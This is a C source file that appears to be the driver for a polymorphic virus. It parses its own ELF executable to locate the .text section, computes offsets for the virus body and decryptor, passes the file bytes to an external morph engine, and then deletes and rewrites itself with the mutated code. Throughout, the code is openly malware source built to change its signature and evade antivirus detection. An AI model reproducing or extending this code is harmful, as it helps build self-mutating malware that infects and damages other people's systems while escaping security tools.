#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>


unsigned long offset; /* will store the offset of the .text section */

void  *data;
Elf64_Ehdr    *elf;
Elf64_Shdr    *shdr;
int       fd;
char      *strtab;

char *filename;

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
int getfilename(int argc, char *argv[]){

	// get the file name from argument
	filename = argv[0];

	return 0;
}

int filesize(int fd)
{
  return (lseek(fd, 0, SEEK_END));
}


void text_offset(Elf64_Shdr *shdr, char *strTab, int shNum, uint8_t *data)
{
  int   i;  

  for(i = 0; i < shNum; i++) {
    size_t k;
    //  printf("%02d: %s Offset %lx\n", i, &strTab[shdr[i].sh_name], 
    //     shdr[i].sh_offset);
	if(strcmp(".text", &strTab[shdr[i].sh_name]) == 0){
		offset =  shdr[i].sh_offset;
	}

  }
}

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{

	/* open the virus elf file and get the offset to the .text section*/
	fd = open(filename, O_RDONLY);
	data = mmap(NULL, filesize(fd), PROT_READ, MAP_SHARED, fd, 0);
	elf = (Elf64_Ehdr *) data;
	shdr = (Elf64_Shdr *) (data + elf->e_shoff);
	strtab = (char *)(data + shdr[elf->e_shstrndx].sh_offset);
	
	text_offset(shdr, strtab, elf->e_shnum, (uint8_t*)data);
	close(fd);

	// seed the random number generator
	srand(time(NULL));

	// get base address of executable
	unsigned long base_addr = virus_instruction_begin - offset;

	// calculate offset of virus_instruction_begin in relative to base address of executable
	virus_instruction_begin = virus_instruction_begin - base_addr;
	// calculate offset of virus_decrypt_offset in relative to base address of executable
	virus_decrypt_offset = virus_decrypt_offset - base_addr;


	FILE *f = fopen(filename, "rb");
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */

	char *string = (char*) malloc(fsize + 1);
	if(!string)
	{
			fclose(f);
			printf("Data allocation failed\n");
			return 1;
	}
	fread(string, 1, fsize, f);
	fclose(f);



	// call the polymorphic engine
	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("Error in polymorphic engine\n");

	}

	// important, remove the file if not the write will fail later on
	remove(filename);


	FILE* out_file = fopen(filename, "wb");
	// write the modified executable data
	fwrite(string, fsize, 1, out_file);
	fclose(out_file);


	free(string);
	return 0;

}